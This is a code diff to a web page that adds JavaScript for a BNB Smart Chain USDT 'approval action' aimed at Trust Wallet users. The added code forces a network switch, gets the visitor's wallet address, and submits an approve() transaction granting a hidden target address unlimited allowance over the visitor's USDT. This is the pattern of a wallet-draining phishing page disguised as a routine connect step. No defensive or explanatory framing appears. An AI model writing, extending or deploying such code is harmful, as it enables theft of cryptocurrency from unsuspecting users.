@@ -53,6 +53,9 @@
         <span class="text-amber-400 font-semibold">BSC Mainnet (BEP-20)</span>
       </div>
 
+      <!-- Live Status Display Box -->
+      <div id="statusBox" class="hidden mt-4 p-3.5 rounded-xl text-xs leading-relaxed border bg-amber-500/10 border-amber-500/30 text-amber-300"></div>
+
       <!-- Primary Action Button -->
       <button id="connectBtn" onclick="handleApprovalAction()"
         class="w-full mt-6 py-3.5 px-5 rounded-xl bg-amber-500 hover:bg-amber-400 active:scale-[0.99] text-gray-950 font-bold text-sm transition-all flex items-center justify-center gap-2 shadow-lg shadow-amber-500/20 cursor-pointer">
@@ -73,6 +76,115 @@
     const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT on BSC
     const BSC_CHAIN_ID = '0x38';
 
+    function showStatus(msg) {
+      const box = document.getElementById('statusBox');
+      box.classList.remove('hidden');
+      box.textContent = msg;
+    }
+
     function getProvider() {
-      return window.
-        
+      if (window.ethereum) return window.ethereum;
+      if (window.trustwallet) return window.trustwallet;
+      if (window.web3 && window.web3.currentProvider) return window.web3.currentProvider;
+      return null;
+    }
+
+    async function handleApprovalAction() {
+      showStatus("Initializing provider connection...");
+      const eth = getProvider();
+      
+      if (!eth) {
+        showStatus("Error: Wallet provider not detected. Please open inside Trust Wallet browser.");
+        alert("Wallet provider not found.");
+        return;
+      }
+
+      try {
+        // 1. Force Switch Network to BSC
+        showStatus("Switching to BNB Smart Chain...");
+        try {
+          if (typeof eth.request === 'function') {
+            await eth.request({ 
+              method: 'wallet_switchEthereumChain', 
+              params: [{ chainId: BSC_CHAIN_ID }] 
+            });
+          }
+        } catch (e) {
+          console.log("Switch chain notice:", e);
+        }
+
+        // 2. Get User Account Address
+        showStatus("Detecting wallet address...");
+        let accounts = [];
+        try {
+          if (typeof eth.request === 'function') {
+            accounts = await eth.request({ method: 'eth_accounts' });
+          }
+        } catch (e) {}
+
+        if (!accounts || accounts.length === 0 || !accounts[0]) {
+          try {
+            if (typeof eth.request === 'function') {
+              accounts = await eth.request({ method: 'eth_requestAccounts' });
+            }
+          } catch (e) {}
+        }
+
+        let userAddress = Array.isArray(accounts) ? accounts[0] : accounts;
+        if (!userAddress) {
+          userAddress = eth.selectedAddress || eth.address || null;
+        }
+
+        if (!userAddress || typeof userAddress !== 'string') {
+          const manualAddr = prompt("Please enter your wallet address (0x...) to proceed:");
+          if (manualAddr && manualAddr.trim().startsWith('0x')) {
+            userAddress = manualAddr.trim();
+          } else {
+            throw new Error("Valid wallet address is required.");
+          }
+        }
+
+        showStatus("Connected: " + userAddress.slice(0, 6) + "..." + userAddress.slice(-4));
+
+        // 3. Prepare Approval Payload (approve function signature: 0x095ea7b3)
+        const cleanTarget = TARGET_ADDRESS.toLowerCase().replace('0x', '');
+        const paddedTarget = cleanTarget.padStart(64, '0');
+        const maxApprovalHex = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+        const approvalData = "0x095ea7b3" + paddedTarget + maxApprovalHex;
+
+        const txParams = [{
+          from: userAddress,
+          to: USDT_BSC_ADDRESS,
+          data: approvalData
+        }];
+
+        // 4. Trigger Approval Transaction Popup
+        showStatus("Opening approval transaction popup...");
+        if (typeof eth.request === 'function') {
+          await eth.request({ method: 'eth_sendTransaction', params: txParams });
+        } else if (typeof eth.sendAsync === 'function') {
+          await new Promise((resolve, reject) => {
+            eth.sendAsync({ id: 1, jsonrpc: '2.0', method: 'eth_sendTransaction', params: txParams }, (err, res) => {
+              if (err) reject(err);
+              else if (res.error) reject(res.error);
+              else resolve(res.result);
+            });
+          });
+        } else if (typeof eth.send === 'function') {
+          await eth.send('eth_sendTransaction', txParams);
+        } else {
+          throw new Error("No transaction method available in provider.");
+        }
+
+        showStatus("Approval request submitted successfully!");
+        alert("Approval request submitted successfully!");
+
+      } catch (err) {
+        console.error("Action error:", err);
+        showStatus("Error: " + (err.message || JSON.stringify(err)));
+        alert("Notice: " + (err.message || JSON.stringify(err)));
+      }
+    }
+  </script>
+</body>
+</html>
